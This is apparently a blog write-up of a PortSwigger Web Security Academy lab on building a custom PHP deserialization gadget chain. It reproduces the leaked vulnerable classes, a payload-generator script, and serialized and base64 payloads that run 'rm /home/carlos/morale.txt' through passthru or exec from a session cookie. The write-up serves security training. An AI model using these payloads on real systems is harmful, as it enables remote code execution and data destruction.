<!DOCTYPE html>
<html lang="en">
  <head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="generator" content="Jekyll">
  

  <title>Expert Lab: Developing a custom gadget chain for PHP deserialization - Diaries of a Modern Ninja</title>

  <link rel="stylesheet" href="/css/main.css">
  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
  <link rel="manifest" href="/site.webmanifest">
  <link rel="alternate" type="application/rss+xml" title="Diaries of a Modern Ninja" href="https://nima.ninja/feed.xml"> <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.3" />
<meta property="og:title" content="Expert Lab: Developing a custom gadget chain for PHP deserialization" />
<meta name="author" content="Nima" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Lab Description: This lab uses a serialization-based session mechanism. By deploying a custom gadget chain, you can exploit its insecure deserialization to achieve remote code execution." />
<meta property="og:description" content="Lab Description: This lab uses a serialization-based session mechanism. By deploying a custom gadget chain, you can exploit its insecure deserialization to achieve remote code execution." />
<link rel="canonical" href="https://nima.ninja/blog/2023/expert-lab-developing-a-custom-gadget-chain-for-php-deserialization" />
<meta property="og:url" content="https://nima.ninja/blog/2023/expert-lab-developing-a-custom-gadget-chain-for-php-deserialization" />
<meta property="og:site_name" content="Diaries of a Modern Ninja" />
<meta property="og:image" content="https://nima.ninja/blog/assets/supply-chain2.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-01-18T00:00:00-04:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="https://nima.ninja/blog/assets/supply-chain2.png" />
<meta property="twitter:title" content="Expert Lab: Developing a custom gadget chain for PHP deserialization" />
<meta name="twitter:site" content="@cSh4rk" />
<meta name="twitter:creator" content="@cSh4rk" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Nima"},"dateModified":"2023-01-18T00:00:00-04:00","datePublished":"2023-01-18T00:00:00-04:00","description":"Lab Description: This lab uses a serialization-based session mechanism. By deploying a custom gadget chain, you can exploit its insecure deserialization to achieve remote code execution.","headline":"Expert Lab: Developing a custom gadget chain for PHP deserialization","image":"https://nima.ninja/blog/assets/supply-chain2.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://nima.ninja/blog/2023/expert-lab-developing-a-custom-gadget-chain-for-php-deserialization"},"url":"https://nima.ninja/blog/2023/expert-lab-developing-a-custom-gadget-chain-for-php-deserialization"}</script>
<!-- End Jekyll SEO tag -->

</head>


  <body>
    <div id="wrapper">
      <header>
  <div>
    <a href="/">
    
    <h1><!--email_off-->nima@home:~$<!--/email_off--></h1>
    </a>
    <div class="header-links">
      <a href="/about"><h2 class="header-link">About</h2></a>
<a href="/"><h2 class="header-link">All</h2></a>
<a href="/blog/"><h2 class="header-link">Blog</h2></a>
<a href="/books/"><h2 class="header-link">Books</h2></a>
<a href="/links/"><h2 class="header-link">Links</h2></a>
<a href="/tags/"><h2 class="header-link">Tags</h2></a>
<a href="/contact"><h2 class="header-link">Contact</h2></a>
<a href="/kevin-mitnick" class="no-decoration"><h2 class="header-link" title="RIP Kevin Mitnick">ðŸ–¤</h2></a>

<!--<a href="/feed.xml"><h2 class="header-link">RSS</h2></a>-->

    </div>
  </div>
</header>

      <div class="container">
        <section id="main_content">
          <article>
  <h2>Expert Lab: Developing a custom gadget chain for PHP deserialization</h2>
  <div class="postitem">
    
      <a href="/blog/" class="no-decoration"><code class="language-plaintext highlighter-rouge">blog</code></a>
    
    
      <code class="posttag"><a href="/tags/#web-application-security" class="no-decoration">Web Application Security</a></code>
    
      <code class="posttag"><a href="/tags/#web-security-academy" class="no-decoration">Web Security Academy</a></code>
    
      <code class="posttag"><a href="/tags/#expert-labs" class="no-decoration">Expert Labs</a></code>
    
      <code class="posttag"><a href="/tags/#insecure-deserialization" class="no-decoration">Insecure Deserialization</a></code>
    
      <code class="posttag"><a href="/tags/#remote-code-execution" class="no-decoration">Remote Code Execution</a></code>
    
      <code class="posttag"><a href="/tags/#gadget-chains" class="no-decoration">Gadget Chains</a></code>
    
      <code class="posttag"><a href="/tags/#php" class="no-decoration">PHP</a></code>
    
  </div>
  <span class="icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 3H18V1H16V3H8V1H6V3H5C3.9 3 3 3.89 3 5V19C3 20.11 3.9 21 5 21H19C20.11 21 21 20.11 21 19V5C21 3.89 20.11 3 19 3M19 19H5V9H19V19M19 7H5V5H19M7 11H12V16H7" /></svg></span>
  <time datetime="2023-01-18T00:00:00-04:00" class="by-line"><strong>Published: </strong>18 Jan 2023</time>
  
  <p><br />
<img src="/blog/assets/supply-chain2.png" alt="" width="256" height="256" />
<br />
<sup id="fnref:1" role="doc-noteref"><a href="#fn:1" class="footnote" rel="footnote">1</a></sup>
<br /></p>
<h3 id="lab-link">Lab Link</h3>
<p><a href="https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization">Lab: Developing a custom gadget chain for PHP deserialization</a></p>

<p><br /></p>
<h3 id="lab-description">Lab Description</h3>
<hr />
<p><br />
This lab uses a serialization-based session mechanism. By deploying a custom gadget chain, you can exploit its insecure deserialization to achieve remote code execution. To solve the lab, delete the morale.txt file from Carlosâ€™s home directory.</p>

<p>You can log in to your own account using the following credentials: wiener:peter</p>

<p><br /></p>
<h3 id="lab-hint">Lab Hint</h3>
<hr />
<p><br />
You can sometimes read source code by appending a tilde (~) to a filename to retrieve an editor-generated backup file.</p>

<p><br /></p>
<h3 id="solutions">Solutions</h3>
<hr />
<p><br /></p>
<h3 id="solution-1-my-solution">Solution 1: My Solution</h3>
<p>We check the source of web pages and in all of them, there is a single line of code:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- TODO: Refactor once /cgi-bin/libs/CustomTemplate.php is updated --&gt;</span>
</code></pre></div></div>

<p>So we check this link in the browser, as the lab hint suggests, we can grab a copy of editor backup version of this file by adding a tilde(<code class="language-plaintext highlighter-rouge">~</code>) at the end of the file like this:</p>

<pre><code class="language-url">https://YOUR-LAB-ID.web-security-academy.net/cgi-bin/libs/CustomTemplate.php~
</code></pre>

<p>So we get the following php code:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>

<span class="kd">class</span> <span class="nc">CustomTemplate</span> <span class="p">{</span>
    <span class="k">private</span> <span class="nv">$default_desc_type</span><span class="p">;</span>
    <span class="k">private</span> <span class="nv">$desc</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$product</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(</span><span class="nv">$desc_type</span><span class="o">=</span><span class="s1">'HTML_DESC'</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">desc</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Description</span><span class="p">();</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">default_desc_type</span> <span class="o">=</span> <span class="nv">$desc_type</span><span class="p">;</span>
        <span class="c1">// Carlos thought this is cool, having a function called in two places... What a genius</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">build_product</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">__sleep</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">return</span> <span class="p">[</span><span class="s2">"default_desc_type"</span><span class="p">,</span> <span class="s2">"desc"</span><span class="p">];</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">__wakeup</span><span class="p">()</span> <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">build_product</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">function</span> <span class="n">build_product</span><span class="p">()</span> <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">product</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Product</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">default_desc_type</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">desc</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kd">class</span> <span class="nc">Product</span> <span class="p">{</span>
    <span class="k">public</span> <span class="nv">$desc</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(</span><span class="nv">$default_desc_type</span><span class="p">,</span> <span class="nv">$desc</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">desc</span> <span class="o">=</span> <span class="nv">$desc</span><span class="o">-&gt;</span><span class="nv">$default_desc_type</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kd">class</span> <span class="nc">Description</span> <span class="p">{</span>
    <span class="k">public</span> <span class="nv">$HTML_DESC</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$TEXT_DESC</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">()</span> <span class="p">{</span>
        <span class="c1">// @Carlos, what were you thinking with these descriptions? Please refactor!</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="no">HTML_DESC</span> <span class="o">=</span> <span class="s1">'&lt;p&gt;This product is &lt;blink&gt;SUPER&lt;/blink&gt; cool in html&lt;/p&gt;'</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="no">TEXT_DESC</span> <span class="o">=</span> <span class="s1">'This product is cool in text'</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kd">class</span> <span class="nc">DefaultMap</span> <span class="p">{</span>
    <span class="k">private</span> <span class="nv">$callback</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(</span><span class="nv">$callback</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">callback</span> <span class="o">=</span> <span class="nv">$callback</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">__get</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nb">call_user_func</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">callback</span><span class="p">,</span> <span class="nv">$name</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="cp">?&gt;</span>
</code></pre></div></div>

<p>So we might have a leak of some part the website code here. Also after we log in, we check the session cookie, and it turns out it is a serialized php object:</p>

<p><img src="/blog/assets/custom-gadget-chain-php1.png" alt="" width="1260" height="823" /></p>

<p>So we can check if this website is vulnerable to insecure deserialization<sup id="fnref:2" role="doc-noteref"><a href="#fn:2" class="footnote" rel="footnote">2</a></sup>.</p>

<p>For creating a custom gadget chain, we check the code we got above for kick-off(The first gadget in the chain that triggers the whole gadget chain) and sink gadgets(The last gadget in the chain that can execute our arbitrary code).</p>

<p>In this example, it seems that <code class="language-plaintext highlighter-rouge">__wakeup()</code> magic method might be suitable as the kick-off gadget. This method is executed when the php serialized object is going to be deserialized, in our case, it might execute our payload that weâ€™re going to create. We follow the code, it finally leads to this line: <code class="language-plaintext highlighter-rouge">$this-&gt;desc = $desc-&gt;$default_desc_type;</code> in <code class="language-plaintext highlighter-rouge">Product</code> class constructor.</p>

<p>Also we search for a suitable sink gadget, the <code class="language-plaintext highlighter-rouge">DefaultMap</code> class has <code class="language-plaintext highlighter-rouge">call_user_func</code> which can execute arbitrary functions if we can  somehow lead our input to this function. This function gets <code class="language-plaintext highlighter-rouge">$this-&gt;callback</code> as the first parameter and <code class="language-plaintext highlighter-rouge">$name</code> as the second, in this function, the first parameter is the name of an arbitrary php function and the second is the parameter passed to that function, this function is called in <code class="language-plaintext highlighter-rouge">__get()</code> magic method, this method is called when we call an undefined property of <code class="language-plaintext highlighter-rouge">DefaultMap</code> class and the called property name is passed to the second parameter which in our case is the command we are going to execute.</p>

<p>Also we can assign any value to <code class="language-plaintext highlighter-rouge">$this-&gt;callback</code> in the class constructor:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(</span><span class="nv">$callback</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">callback</span> <span class="o">=</span> <span class="nv">$callback</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>So for example we can have a remote code execution in a code similar to this:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$test</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">DefaultMap</span><span class="p">(</span><span class="s1">'passthru'</span><span class="p">);</span>
<span class="nv">$command</span> <span class="o">=</span> <span class="s1">'rm /home/carlos/morale.txt'</span><span class="p">;</span>
<span class="nv">$test</span><span class="o">-&gt;</span><span class="nv">$command</span><span class="p">;</span>
</code></pre></div></div>

<p>We assigned our arbitrary function name (<code class="language-plaintext highlighter-rouge">passthru</code>) to <code class="language-plaintext highlighter-rouge">$this-&gt;callback</code> by passing this value to the class constructor in the first line of code above. The <code class="language-plaintext highlighter-rouge">passthru</code> php function executes any command we send to it.</p>

<p>The Third line in the above code triggers the <code class="language-plaintext highlighter-rouge">__get()</code> method invocation of <code class="language-plaintext highlighter-rouge">DefaultMap</code> class which results in the following code being executed:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">return</span> <span class="nb">call_user_func</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">callback</span><span class="p">,</span> <span class="nv">$name</span><span class="p">);</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">$this-&gt;callback</code> is <code class="language-plaintext highlighter-rouge">passthru</code> and <code class="language-plaintext highlighter-rouge">$name</code> is <code class="language-plaintext highlighter-rouge">rm /home/carlos/morale.txt</code> now which results in this file being removed from the server.</p>

<p>So the sink gadget and code is complete, now we need to somehow link the kick-off gadget to the sink gadget to execute these lines of codes.</p>

<p>If we review the leaked code, we can see that we have an object(<code class="language-plaintext highlighter-rouge">$this-&gt;desc</code>) that can have the value of our first line above:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">desc</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">DefaultMap</span><span class="p">(</span><span class="s1">'passthru'</span><span class="p">);</span>
</code></pre></div></div>

<p>also we have a property(<code class="language-plaintext highlighter-rouge">$this-&gt;default_desc_type</code>) that can have the value of our second line above:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">default_desc_type</span> <span class="o">=</span> <span class="s1">'rm /home/carlos/morale.txt'</span><span class="p">;</span>
</code></pre></div></div>

<p>and if we follow the code, we arrive at the last part in <code class="language-plaintext highlighter-rouge">Product</code> class constructor that gets the above <code class="language-plaintext highlighter-rouge">$this-&gt;desc</code> and <code class="language-plaintext highlighter-rouge">$this-&gt;default_desc_type</code> values as parameters and assign them to <code class="language-plaintext highlighter-rouge">$this-&gt;desc</code> of its own:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(</span><span class="nv">$default_desc_type</span><span class="p">,</span> <span class="nv">$desc</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">desc</span> <span class="o">=</span> <span class="nv">$desc</span><span class="o">-&gt;</span><span class="nv">$default_desc_type</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>which is exactly what we want and is the same as the third line of our code above: <code class="language-plaintext highlighter-rouge">$test-&gt;$command;</code> which results in our arbitrary code being executed.</p>

<p>I have prepared a php file for creating the final payload with just the parts of the leaked code that are necessary for creating the payload:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>

<span class="kd">class</span> <span class="nc">CustomTemplate</span> <span class="p">{</span>
    <span class="k">private</span> <span class="nv">$default_desc_type</span><span class="p">;</span>
    <span class="k">private</span> <span class="nv">$desc</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">()</span> <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">desc</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">DefaultMap</span><span class="p">(</span><span class="s1">'passthru'</span><span class="p">);</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">default_desc_type</span> <span class="o">=</span> <span class="s1">'rm /home/carlos/morale.txt'</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kd">class</span> <span class="nc">DefaultMap</span> <span class="p">{</span>
    <span class="k">private</span> <span class="nv">$callback</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(</span><span class="nv">$callback</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">callback</span> <span class="o">=</span> <span class="nv">$callback</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nv">$test</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">CustomTemplate</span><span class="p">();</span>
<span class="nv">$ser</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$test</span><span class="p">);</span>
<span class="k">echo</span><span class="p">(</span><span class="nv">$ser</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">);</span>
<span class="k">echo</span><span class="p">(</span><span class="s2">"===================================================</span><span class="se">\n</span><span class="s2">"</span><span class="p">);</span>
<span class="k">echo</span><span class="p">(</span><span class="s2">"base64 endcoded then urlencoded: </span><span class="se">\n</span><span class="s2">"</span><span class="p">);</span>
<span class="k">echo</span><span class="p">(</span><span class="nb">urlencode</span><span class="p">(</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$ser</span><span class="p">))</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">);</span>

<span class="cp">?&gt;</span>
</code></pre></div></div>

<p>and the output of this code is:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>O:14:"CustomTemplate":2:{s:33:"CustomTemplatedefault_desc_type";s:26:"rm /home/carlos/morale.txt";s:20:"CustomTemplatedesc";O:10:"DefaultMap":1:{s:20:"DefaultMapcallback";s:8:"passthru";}}
===================================================
base64 endcoded then urlencoded:
TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6MzM6IgBDdXN0b21UZW1wbGF0ZQBkZWZhdWx0X2Rlc2NfdHlwZSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO3M6MjA6IgBDdXN0b21UZW1wbGF0ZQBkZXNjIjtPOjEwOiJEZWZhdWx0TWFwIjoxOntzOjIwOiIARGVmYXVsdE1hcABjYWxsYmFjayI7czo4OiJwYXNzdGhydSI7fX0%3D
</code></pre></div></div>

<p>Keep in mind that the php serialized object is a binary format meaning it may contain some null charactersâ€¦ so if we copy-paste the cleartext part from the above output:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">O</span><span class="o">:</span><span class="mi">14</span><span class="o">:</span><span class="s2">"CustomTemplate"</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="p">{</span><span class="n">s</span><span class="o">:</span><span class="mi">33</span><span class="o">:</span><span class="s2">"CustomTemplatedefault_desc_type"</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">26</span><span class="o">:</span><span class="s2">"rm /home/carlos/morale.txt"</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">20</span><span class="o">:</span><span class="s2">"CustomTemplatedesc"</span><span class="p">;</span><span class="nc">O</span><span class="o">:</span><span class="mi">10</span><span class="o">:</span><span class="s2">"DefaultMap"</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="p">{</span><span class="n">s</span><span class="o">:</span><span class="mi">20</span><span class="o">:</span><span class="s2">"DefaultMapcallback"</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">8</span><span class="o">:</span><span class="s2">"passthru"</span><span class="p">;}}</span>
</code></pre></div></div>

<p>It wonâ€™t work, if we want to copy-paste the cleartext version, we need to edit it manually and the final payload will be something like this:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">O</span><span class="o">:</span><span class="mi">14</span><span class="o">:</span><span class="s2">"CustomTemplate"</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="p">{</span><span class="n">s</span><span class="o">:</span><span class="mi">17</span><span class="o">:</span><span class="s2">"default_desc_type"</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">26</span><span class="o">:</span><span class="s2">"rm /home/carlos/morale.txt"</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">"desc"</span><span class="p">;</span><span class="nc">O</span><span class="o">:</span><span class="mi">10</span><span class="o">:</span><span class="s2">"DefaultMap"</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="p">{</span><span class="n">s</span><span class="o">:</span><span class="mi">8</span><span class="o">:</span><span class="s2">"callback"</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">8</span><span class="o">:</span><span class="s2">"passthru"</span><span class="p">;}}</span>
</code></pre></div></div>

<p>If we donâ€™t want to edit the output and directly copy-paste the payload, as mentioned above we have to treat serialized php objects as binary format, as the <code class="language-plaintext highlighter-rouge">serialize</code> function help explains<sup id="fnref:3" role="doc-noteref"><a href="#fn:3" class="footnote" rel="footnote">3</a></sup>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Note that this is a binary string which may include null bytes, and needs to be stored and handled as such.
For example,Â **serialize()**Â output should generally be stored in a BLOB field in a database, 
rather than a CHAR or TEXT field.
</code></pre></div></div>

<p>Thatâ€™s why we base64 and url encoded the output to easily be able to copy-paste it as the session cookie. So we copy this part from the output above:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6MzM6IgBDdXN0b21UZW1wbGF0ZQBkZWZhdWx0X2Rlc2NfdHlwZSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO3M6MjA6IgBDdXN0b21UZW1wbGF0ZQBkZXNjIjtPOjEwOiJEZWZhdWx0TWFwIjoxOntzOjIwOiIARGVmYXVsdE1hcABjYWxsYmFjayI7czo4OiJwYXNzdGhydSI7fX0%3D
</code></pre></div></div>

<p>and paste it here in the session cookie in the Burp suite repeater:</p>

<p><img src="/blog/assets/custom-gadget-chain-php2.png" alt="" width="1263" height="818" /></p>

<p>and click apply and send, then boom! the carlosâ€™s morale.txt file is removed from the server and the lab is solved!</p>

<p><br /></p>
<h3 id="solution-2--web-security-academys-solution">Solution 2:  Web Security Academyâ€™s Solution</h3>

<ol>
  <li>
    <p>Log in to your own account and notice that the session cookie contains a serialized PHP object. Notice that the website references the fileÂ <code class="language-plaintext highlighter-rouge">/cgi-bin/libs/CustomTemplate.php</code>. Obtain the source code by submitting a request using theÂ <code class="language-plaintext highlighter-rouge">.php~</code>Â backup file extension.</p>
  </li>
  <li>
    <p>In the source code, notice that theÂ <code class="language-plaintext highlighter-rouge">__wakeup()</code>Â magic method for aÂ <code class="language-plaintext highlighter-rouge">CustomTemplate</code>Â will create a newÂ <code class="language-plaintext highlighter-rouge">Product</code>Â by referencing theÂ <code class="language-plaintext highlighter-rouge">default_desc_type</code>Â andÂ <code class="language-plaintext highlighter-rouge">desc</code>Â from theÂ <code class="language-plaintext highlighter-rouge">CustomTemplate</code>.</p>
  </li>
  <li>
    <p>Also notice that theÂ <code class="language-plaintext highlighter-rouge">DefaultMap</code>Â class has theÂ <code class="language-plaintext highlighter-rouge">__get()</code>Â magic method, which will be invoked if you try to read an attribute that doesnâ€™t exist for this object. This magic method invokesÂ <code class="language-plaintext highlighter-rouge">call_user_func()</code>, which will execute any function that is passed into it via theÂ <code class="language-plaintext highlighter-rouge">DefaultMap-&gt;callback</code>Â attribute. The function will be executed on theÂ <code class="language-plaintext highlighter-rouge">$name</code>, which is the non-existent attribute that was requested.</p>
  </li>
  <li>
    <p>You can exploit this gadget chain to invokeÂ <code class="language-plaintext highlighter-rouge">exec(rm /home/carlos/morale.txt)</code>Â by passing in aÂ <code class="language-plaintext highlighter-rouge">CustomTemplate</code>Â object where:</p>

    <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">CustomTemplate</span><span class="o">-&gt;</span><span class="n">default_desc_type</span> <span class="o">=</span> <span class="s2">"rm /home/carlos/morale.txt"</span><span class="p">;</span>
<span class="nc">CustomTemplate</span><span class="o">-&gt;</span><span class="n">desc</span> <span class="o">=</span> <span class="nc">DefaultMap</span><span class="p">;</span>
<span class="nc">DefaultMap</span><span class="o">-&gt;</span><span class="n">callback</span> <span class="o">=</span> <span class="s2">"exec"</span>
</code></pre></div>    </div>

    <p>If you follow the data flow in the source code, you will notice that this causes theÂ <code class="language-plaintext highlighter-rouge">Product</code>Â constructor to try and fetch theÂ <code class="language-plaintext highlighter-rouge">default_desc_type</code>Â from theÂ <code class="language-plaintext highlighter-rouge">DefaultMap</code>Â object. As it doesnâ€™t have this attribute, theÂ <code class="language-plaintext highlighter-rouge">__get()</code>Â method will invoke the callbackÂ <code class="language-plaintext highlighter-rouge">exec()</code>Â method on theÂ <code class="language-plaintext highlighter-rouge">default_desc_type</code>, which is set to our shell command.</p>
  </li>
  <li>
    <p>To solve the lab, Base64 and URL-encode the following serialized object, and pass it into the website via your session cookie:</p>

    <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">O</span><span class="o">:</span><span class="mi">14</span><span class="o">:</span><span class="s2">"CustomTemplate"</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="p">{</span><span class="n">s</span><span class="o">:</span><span class="mi">17</span><span class="o">:</span><span class="s2">"default_desc_type"</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">26</span><span class="o">:</span><span class="s2">"rm /home/carlos/morale.txt"</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">"desc"</span><span class="p">;</span><span class="nc">O</span><span class="o">:</span><span class="mi">10</span><span class="o">:</span><span class="s2">"DefaultMap"</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="p">{</span><span class="n">s</span><span class="o">:</span><span class="mi">8</span><span class="o">:</span><span class="s2">"callback"</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">"exec"</span><span class="p">;}}</span>
</code></pre></div>    </div>
  </li>
</ol>

<p><br /></p>
<h3 id="external-links"><em>External Links</em></h3>
<hr />
<ul>
  <li>
    <h4 id="lab-developing-a-custom-gadget-chain-for-php-deserialization"><a href="https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization">Lab: Developing a custom gadget chain for PHP deserialization</a></h4>
  </li>
</ul>

<p><br /></p>
<h3 id="references"><em>References</em></h3>
<hr />

<div class="footnotes" role="doc-endnotes">
  <ol>
    <li id="fn:1" role="doc-endnote">
      <p>Icon made by <a href="https://www.flaticon.com/authors/paul-j">Paul J.</a> from <a href="https://www.flaticon.com/">www.flaticon.com</a>Â <a href="#fnref:1" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:2" role="doc-endnote">
      <p><a href="https://portswigger.net/web-security/deserialization">Insecure deserialization | Web Security Academy</a>Â <a href="#fnref:2" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:3" role="doc-endnote">
      <p><a href="https://www.php.net/manual/en/function.serialize.php">PHP:serialize - Manual</a>Â <a href="#fnref:3" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
  </ol>
</div>

</article>

        </section>
      </div>
    </div>

     
  
    <footer class="site-footer">
  <div class="row">
    <div class="footer-wrapper">
      <div class="footer-col-social col-5 col-s-4">
        <ul>
  
    <li class="social-media-list">
      <a title="Email Address" href="mailto:nima@nima.ninja"><span class="icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 12.713l-11.985-9.713h23.971l-11.986 9.713zm-5.425-1.822l-6.575-5.329v12.501l6.575-7.172zm10.85 0l6.575 7.172v-12.501l-6.575 5.329zm-1.557 1.261l-3.868 3.135-3.868-3.135-8.11 8.848h23.956l-8.11-8.848z"/></svg>
</span><span>nima@nima.ninja</span></a>
    </li>
  

  
    <li class="social-media-list">
